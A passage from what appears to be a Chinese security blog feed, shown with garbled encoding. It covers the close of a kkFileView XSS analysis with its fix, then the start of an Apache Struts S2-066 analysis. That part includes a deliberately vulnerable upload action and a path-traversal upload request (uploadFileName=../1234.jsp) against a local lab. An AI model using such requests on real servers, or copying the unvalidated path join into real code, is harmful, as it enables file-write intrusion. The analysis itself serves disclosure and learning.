previewFactory.get(fileAttribute);</span><br><span class="line">    logger.info(<span class="string">&quot;é¢„è§ˆæ–‡ä»¶urlï¼š&#123;&#125;ï¼ŒpreviewTypeï¼š&#123;&#125;&quot;</span>, fileUrl, fileAttribute.getType());</span><br><span class="line">    <span class="keyword">return</span> filePreview.filePreviewHandle(fileUrl, model, fileAttribute);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯¹ä¼ å…¥çš„å‚æ•°urlè¿›è¡ŒBase64è§£ç ï¼Œç„¶åè·Ÿè¿›<code>cn.keking.service.FileHandlerService#getFileAttribute</code>æ–¹æ³•ï¼Œè¿™é‡Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯æ¼æ´ç‚¹ï¼Œåªéœ€è¦è®©ä¼ å…¥çš„å‚æ•°ä¸ä¼šæŠ¥é”™æå‰é€€å‡ºå°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–æ–‡ä»¶å±æ€§</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ–‡ä»¶å±æ€§</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> FileAttribute <span class="title function_">getFileAttribute</span><span class="params">(String url, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">attribute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileAttribute</span>();</span><br><span class="line">    String suffix;</span><br><span class="line">    FileType type;</span><br><span class="line">    String fileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(fullFileName)) &#123;</span><br><span class="line">        fileName = fullFileName;</span><br><span class="line">        type = FileType.typeFromFileName(fullFileName);</span><br><span class="line">        suffix = KkFileUtils.suffixFromFileName(fullFileName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileName = WebUtils.getFileNameFromURL(url);</span><br><span class="line">        type = FileType.typeFromUrl(url);</span><br><span class="line">        suffix = WebUtils.suffixFromUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.contains(<span class="string">&quot;?fileKey=&quot;</span>)) &#123;</span><br><span class="line">        attribute.setSkipDownLoad(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    attribute.setType(type);</span><br><span class="line">    attribute.setName(fileName);</span><br><span class="line">    attribute.setSuffix(suffix);</span><br><span class="line">    url = WebUtils.encodeUrlFileName(url);</span><br><span class="line">    attribute.setUrl(url);</span><br><span class="line">    <span class="keyword">if</span> (req != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">officePreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;officePreviewType&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url,<span class="string">&quot;fileKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(officePreviewType)) &#123;</span><br><span class="line">            attribute.setOfficePreviewType(officePreviewType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(fileKey)) &#123;</span><br><span class="line">            attribute.setFileKey(fileKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">tifPreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;tifPreviewType&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(tifPreviewType)) &#123;</span><br><span class="line">            attribute.setTifPreviewType(tifPreviewType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;filePassword&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(filePassword)) &#123;</span><br><span class="line">            attribute.setFilePassword(filePassword);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userToken</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;userToken&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(userToken)) &#123;</span><br><span class="line">            attribute.setUserToken(userToken);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attribute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠ¥é”™çš„ä¸»è¦å½±å“å› ç´ åœ¨äº<code>WebUtils.encodeUrlFileName</code>è¿™ä¸ªæ–¹æ³•çš„å¤„ç†ï¼Œäºæ˜¯æ„é€ ä¸€ä¸ª<code>http://xxxxxxx/test.png</code>å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹urlä¸­çš„æ–‡ä»¶åè¿›è¡ŒUTF-8ç¼–ç </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ–‡ä»¶åç¼–ç åçš„url</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodeUrlFileName</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    String encodedFileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fullFileName != <span class="literal">null</span> &amp;&amp; fullFileName.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            encodedFileName = URLEncoder.encode(fullFileName, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterStr</span> <span class="operator">=</span> url.substring(url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        parameterStr = parameterStr.replaceFirst(fullFileName, encodedFileName);</span><br><span class="line">        <span class="keyword">return</span> noQueryUrl + parameterStr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.contains(<span class="string">&quot;?&quot;</span>) ? url.indexOf(<span class="string">&quot;?&quot;</span>) : url.length());</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameStartIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameEndIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        encodedFileName = URLEncoder.encode(noQueryUrl.substring(fileNameStartIndex, fileNameEndIndex), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url.substring(<span class="number">0</span>, fileNameStartIndex) + encodedFileName + url.substring(fileNameEndIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°ä¸»é€»è¾‘ï¼Œ<code>previewFactory.get(fileAttribute)</code>ä¼šè·å–å¾—åˆ°çš„æ–‡ä»¶å±æ€§ï¼Œå¹¶åˆ†é…å¯¹åº”æ–‡ä»¶ç±»å‹çš„é¢„è§ˆå¤„ç†å™¨ï¼Œè¿™é‡Œçš„å¤„ç†æ–¹å¼åº”è¯¥æ˜¯å·¥å‚æ¨¡å¼çš„è®¾è®¡æ€æƒ³</p><p>æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„é¢„è§ˆå¤„ç†å’Œå‰é¢ä¸¤å¤„XSSæ¼æ´ä¸€æ ·ï¼Œéƒ½æ˜¯åˆ©ç”¨å›¾ç‰‡å¤„ç†çš„æ¨¡æ¿ï¼Œæˆ‘ä»¬å‰é¢ä¼ å…¥äº†å½¢å¦‚<code>http://xxxxxxx/test.png</code>çš„å€¼ï¼Œäºæ˜¯å¯ä»¥è®©æ–‡ä»¶å±æ€§çš„ç±»å‹ä¸ºPICTURE</p><p><img src="https://s2.loli.net/2024/12/20/mNLzbsWpiOZ9Ene.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/brQ9d5pRqc2iGfJ.png" alt="img"></p><p>ä»è€Œä½¿å¾—æœ€åäº¤ç”±<code>cn.keking.service.impl.PictureFilePreviewImpl#filePreviewHandle</code>è¿›è¡Œå¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    List&lt;String&gt; imgUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    imgUrls.add(url);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> fileAttribute.getFileKey();</span><br><span class="line">    List&lt;String&gt; zipImgUrls = fileHandlerService.getImgCache(fileKey);</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(zipImgUrls)) &#123;</span><br><span class="line">        imgUrls.addAll(zipImgUrls);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä¸æ˜¯httpå¼€å¤´ï¼Œæµè§ˆå™¨ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œéœ€ä¸‹è½½åˆ°æœ¬åœ°</span></span><br><span class="line">    <span class="keyword">if</span> (url != <span class="literal">null</span> &amp;&amp; !url.toLowerCase().startsWith(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> fileHandlerService.getRelativePath(response.getContent());</span><br><span class="line">            imgUrls.clear();</span><br><span class="line">            imgUrls.add(file);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å’Œå‰é¢å·®ä¸å¤šäº†ï¼Œä¼ å…¥å¾—urlå€¼ä¸ç»è¿‡æ»¤æˆ–å…¶ä»–å¤„ç†çš„ç›´æ¥ä¼ å…¥äº†æ¨¡æ¿ä¸­ï¼Œå¯¼è‡´äº†XSSç¼ºé™·</p><h3 id="ä¿®å¤-4"><a href="#ä¿®å¤-4" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>v4.2.0ä¸­ä¿®å¤å&#x2F;picturesPreviewçš„ä»£ç ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/picturesPreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">picturesPreview</span><span class="params">(String urls, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    String fileUrls;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrls = WebUtils.decodeUrl(urls);</span><br><span class="line">        <span class="comment">// é˜²æ­¢XSSæ”»å‡»</span></span><br><span class="line">        fileUrls = KkFileUtils.htmlEscape(fileUrls);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;urls&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;é¢„è§ˆæ–‡ä»¶urlï¼š&#123;&#125;ï¼Œurlsï¼š&#123;&#125;&quot;</span>, fileUrls, urls);</span><br><span class="line">    <span class="comment">// æŠ½å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶åˆ—è¡¨</span></span><br><span class="line">    String[] images = fileUrls.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">    List&lt;String&gt; imgUrls = Arrays.asList(images);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">    <span class="type">String</span> <span class="variable">currentUrl</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;currentUrl&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(currentUrl)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decodedCurrentUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.decodeBase64(currentUrl));</span><br><span class="line">        decodedCurrentUrl = KkFileUtils.htmlEscape(decodedCurrentUrl);   <span class="comment">// é˜²æ­¢XSSæ”»å‡»</span></span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, decodedCurrentUrl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, imgUrls.get(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹ä¼ å…¥å‰ç«¯æ¨¡æ¿çš„å‚æ•°éƒ½è¿›è¡Œäº†HTMLå®ä½“ç¼–ç </p><p>&#x2F;onlinePreviewå¤„çš„ä¿®å¤å¦‚ä¸‹</p><p><a href="https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33">https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33</a></p><p><img src="https://s2.loli.net/2024/12/20/wBcWzaO6NjnV57D.png" alt="img"></p><p>ä¹Ÿæ˜¯åŠ å…¥äº†HTMLå®ä½“ç¼–ç </p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> kkFileView </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Struts S2-066 æ¼æ´åˆ†æ</title>
      <link href="/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066) - y4tacker</a></p><p><a href="https://xz.aliyun.com/t/13834">Struts2 S2-066æ¼æ´æµ…æ - zh1z****</a></p><h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Apache Struts 2æ˜¯ä¸€ä¸ªåŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶ï¼Œå¯ç”¨äºåˆ›å»ºä¼ä¸šçº§Java webåº”ç”¨ç¨‹åºã€‚</p><p>ç”±äºæ–‡ä»¶ä¸Šä¼ é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå¨èƒè€…å¯æ“çºµæ–‡ä»¶ä¸Šä¼ å‚æ•°å¯¼è‡´è·¯å¾„éå†ï¼ŒæŸäº›æƒ…å†µä¸‹å¯èƒ½ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>Struts 2.0.0 - Struts 2.3.37 (EOL)</p><p>Struts 2.5.0 - Struts 2.5.32</p><p>Struts 6.0.0 - Struts 6.3.0</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å’ŒS2-067çš„ç¯å¢ƒæ­å»ºç±»ä¼¼ï¼Œè¿™é‡ŒApache Struts 2æ¼æ´ç‰ˆæœ¬é€‰æ‹©6.3.0</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰UploadActionç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2066.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp/s2066&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2066&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2066.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 